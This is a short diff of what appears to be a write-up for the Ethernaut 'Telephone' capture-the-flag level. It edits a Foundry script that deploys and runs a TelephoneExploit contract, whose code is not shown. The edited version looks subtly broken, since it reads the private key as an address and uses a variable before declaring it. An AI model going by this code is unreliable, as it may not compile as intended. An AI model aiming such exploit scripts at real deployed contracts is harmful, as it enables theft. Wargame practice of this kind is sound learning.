@@ -168,18 +168,16 @@ contract TelephoneTest is Test {
 ```solidity
 contract Exploit is Script {
 
+        Telephone level = Telephone(instance); 
+        TelephoneExploit public exploit;
         address instance = vm.envAddress("INSTANCE_LEVEL4");
-        address hacker = vm.envAddress("PUBLIC_KEY");
-
-        Telephone level = Telephone(levelInstance);        
+        address hacker = vm.envAddress("PRIVATE_KEY");
         
         function run() external {
 
-            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
-            
-            TelephoneExploit exploit = new TelephoneExploit();
+            vm.startBroadcast(hacker);
+            exploit = new TelephoneExploit();
             exploit.run(level);
-
             vm.stopBroadcast();
     }
 }
